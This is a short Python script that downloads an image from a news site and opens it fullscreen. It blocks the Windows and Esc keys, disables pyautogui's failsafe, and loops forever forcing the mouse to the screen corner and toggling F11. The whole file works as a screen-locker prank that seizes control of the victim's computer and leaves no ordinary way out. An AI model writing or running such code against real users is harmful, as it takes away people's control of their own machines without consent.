import requests
import os
import tkinter as tk
import time
import pyautogui
import keyboard
pyautogui.FAILSAFE = False

root = tk.Tk()
url = 'https://www.volynnews.com/resize/640x555/r/files/news/2022/02-27/332763/IMG_6709.JPG'

img = requests.get(url)
imgOption = open('palanica.jpg', 'wb')
imgOption.write(img.content)
imgOption.close()

keyboard.block_key('windows')
keyboard.block_key('esc')
os.system('palanica.jpg')
time.sleep(0.3)
pyautogui.press('f11')
while True:
    pyautogui.moveTo(root.winfo_screenwidth(), root.winfo_screenheight(), 0)
    pyautogui.press('f11')